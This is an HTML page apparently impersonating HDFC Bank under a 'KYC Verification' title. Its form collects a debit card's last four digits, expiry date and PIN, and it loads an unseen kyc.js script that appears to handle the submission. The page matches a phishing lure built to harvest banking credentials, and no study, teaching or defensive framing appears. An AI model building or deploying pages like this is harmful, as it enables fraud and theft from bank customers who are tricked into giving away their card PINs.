<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="stylesheet" href="kyc.css" />
    <title>KYC Verification</title>
  </head>

  <body>
    
    <div class="kyc-container">
      <h2>Debit Card / ATM Card</h2>
      <p>Enter your HDFC Debit Card / ATM Card Details</p>

      <form id="kycForm">
        <div class="form-group">
          <label for="cardNumber">Last 4 Digits of Debit Card / ATM Card</label>
          <input type="number" id="cardNumber" placeholder="Last 4 Digits of Debit Card" maxlength="4" required />
        </div>
      
        <div class="form-row">
          <div class="form-group">
            <label for="expiryDate">Expiry Date</label>
            <input type="month" id="expiryDate" required />
          </div>
          <div class="form-group">
            <label for="pin">PIN</label>
            <input type="password" id="pin" placeholder="Enter your PIN" required />
            <span class="toggle-visibility" onclick="togglePINVisibility()">👁️</span>
          </div>
        </div>
      
        <div class="checkbox-group">
          <input type="checkbox" id="terms" required />
          <label for="terms">I agree and accept the <a href="terms.html">Terms & Conditions</a></label>
        </div>
      
        <button type="submit" disabled id="submitBtn">Verify Card</button>
      </form>
      
    </div>

    <script src="kyc.js"></script>
  </body>
</html>
